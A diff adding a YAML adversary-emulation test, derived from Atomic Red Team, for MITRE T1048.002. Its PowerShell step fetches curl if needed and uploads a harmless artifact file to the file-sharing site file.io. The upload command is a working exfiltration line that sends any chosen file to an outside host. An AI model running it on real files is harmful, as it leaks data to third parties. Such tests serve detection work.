@@ -1,0 +1,95 @@
+---
+api_version: 2.0
+uuid: 04035395-1a63-4a9f-89bd-0a18190d431d
+name: Exfiltrate data HTTPS using curl windows
+description: |
+  Exfiltrate data HTTPS using curl to file share site file.io
+  Derived from: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.md#atomic-test-1---exfiltrate-data-https-using-curl-windows
+requirements:
+  platforms:
+    - os: windows
+mitre:
+  tactics:
+    - TA0010 Exfiltration
+  techniques:
+    - T1048 Exfiltration Over Alternative Protocol
+  subtechniques:
+    - T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+
+args:
+  - name: input_file
+    description: Test file to upload
+    type: string
+    default: $PWD\bin\artifact
+  - name: curl_path
+    description: Path to curl.
+    type: path
+    default: C:\Windows\System32\curl.exe
+
+steps:
+  - name: exfil
+    description: |
+    executor: powershell
+    inline: |
+      $binDir = "bin"
+      New-Item -Type Directory -Path "$binDir" -ErrorAction Ignore | Out-Null
+
+      $inputFile = "{{.Args.input_file}}"
+      if (-Not (Test-Path $inputFile)){
+        Write-Host "Creating artifact file."
+        "Test Text" | Out-File -FilePath "$binDir\artifact"
+        $inputFile = "$binDir\artifact"
+      }
+
+      $curlPath = "{{.Args.curl_path}}"
+      if (-Not (Test-Path $curlPath)){
+        Write-Host "Curl cannot be found at: {{.Args.curl_path}}"
+        $curlZip = New-TemporaryFile
+        Write-Host "Downloading curl..."
+        try {
+          Invoke-WebRequest "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" -Outfile "${curlZip}.zip"
+          Expand-Archive -LiteralPath "${curlZip}.zip" -DestinationPath "$binDir"
+        } catch{
+          Write-Host "Failed to download and/or extract curl."
+          exit 1
+        }
+        Copy-Item "$binDir\curl-*\$binDir\curl.exe" $binDir
+        Remove-Item "${curlZip}.zip"
+        $curlPath = "$binDir\curl.exe"
+        Write-Host "Curl downloaded and extracted successfully."
+      }
+
+      if (-Not (Test-Path $curlPath)){
+        Write-Host  "Failed to find curl.exe in the extracted archive."
+        exit 1
+      }
+      elseif (-Not (Test-Path $inputFile)){
+        Write-Host  "Failed to find artifact input file."
+      }
+      else{
+        Write-Host "Exfiltrating data from artifact to site file.io ..."
+        try{
+          &"$curlPath" -F "file=@$inputFile" -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+        } catch {
+          Write-Host "Exfiltrating artifact to site file.io: Failed"
+          exit 1
+        }
+        Write-Host "Exfiltrating artifact to site file.io: Succeeded"
+      }
+
+    cleanup:
+      description:
+      executor: powershell
+      inline: |
+        $binDir = "bin"
+        if (Test-Path $binDir){
+          try {
+            Remove-Item -r $binDir -ErrorAction Stop
+            Write-Host "Cleanup successful."
+          } catch {
+            Write-Host "Failed to remove bin directory: $($Error[0].Message)"
+            exit 1
+          }
+        } else {
+          Write-Host "Bin directory not found. Skipping cleanup."
+        }
